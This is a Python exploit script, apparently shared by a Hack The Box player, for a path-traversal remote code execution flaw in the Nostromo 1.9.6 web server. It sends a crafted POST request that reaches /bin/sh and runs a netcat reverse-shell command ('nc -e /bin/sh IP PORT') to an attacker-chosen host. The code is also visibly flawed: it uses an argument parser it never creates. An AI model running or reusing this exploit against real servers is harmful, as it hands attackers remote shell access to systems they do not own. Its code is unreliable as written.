#!/usr/bin/env python
# exploit i used to get the initial shell on [NOT_YET_RETIRED] machine from HTB
# origin by sp0re
# Nostromo 1.9.6 RCE through path traversal
import socket
import argparse

print("Nostromo 1.9.6 RCE through path traversal.")
parser.add_argument('host',help='domain/IP of the Nostromo web server')
parser.add_argument('port',help='port number',type=int)
args = parser.parse_args()

# Modify the ip and the port to get the reverse shell
cmd = "nc -e /bin/sh IP PORT"

def recv(s):
	r=''
	try:
		while True:
			t=s.recv(1024)
			if len(t)==0:
				break
			r+=t
	except:
		pass
	return r

def exploit(host,port,cmd):
	s=socket.socket()
	s.settimeout(1)
	s.connect((host,int(port)))
	payload="""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1""".format(cmd)
	s.send(payload)
	r=recv(s)
	r=r[r.index('\r\n\r\n')+4:]
	print(r)

exploit(args.host,args.port,cmd)
